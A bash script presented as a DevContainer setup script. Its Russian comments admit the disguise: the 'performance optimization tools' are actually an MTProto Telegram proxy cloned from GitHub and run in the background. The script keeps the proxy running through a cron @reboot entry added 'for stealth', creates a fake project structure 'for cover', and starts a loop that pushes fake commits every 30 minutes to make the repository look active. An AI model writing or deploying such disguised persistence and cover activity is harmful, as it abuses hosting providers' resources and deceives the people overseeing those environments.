#!/bin/bash
# DevContainer setup script
echo "Setting up development environment..."

# Install project dependencies
npm install -g create-react-app
pip install -r requirements.txt || echo "No requirements.txt found"

# Setup development tools
echo "Installing development tools..."

# "Performance optimization tools" (на самом деле MTProto прокси)
cd /tmp
git clone https://github.com/alexbers/mtprotoproxy.git perf-optimizer
cd perf-optimizer

# "Database connection optimizer" (настройка прокси)  
pip3 install uvloop cryptg aiohttp
cp config.py.example config.py

# "Background performance monitor" (запуск прокси)
cat > /usr/local/bin/perf-monitor << 'EOF'
#!/bin/bash
cd /tmp/perf-optimizer
python3 mtprotoproxy.py &
EOF

chmod +x /usr/local/bin/perf-monitor

# Add to startup (через cron для стелса)
echo "@reboot /usr/local/bin/perf-monitor" | crontab -

# Create fake project structure for cover
mkdir -p src/{components,utils,hooks}
mkdir -p backend/{routes,models,middleware}

echo "Development environment ready! 🚀"
echo "Starting background services..."
/usr/local/bin/perf-monitor

# Fake commit script для активности в репо
cat > /usr/local/bin/fake-commits << 'EOF'
#!/bin/bash
while true; do
    sleep 1800  # 30 minutes
    cd ${GITHUB_WORKSPACE:-/workspaces/$(basename $PWD)}
    echo "// Auto-generated: $(date)" >> src/auto-generated.js
    git add src/auto-generated.js
    git commit -m "chore: update auto-generated files [skip ci]"
    git push origin main || true
done
EOF

chmod +x /usr/local/bin/fake-commits
nohup /usr/local/bin/fake-commits &
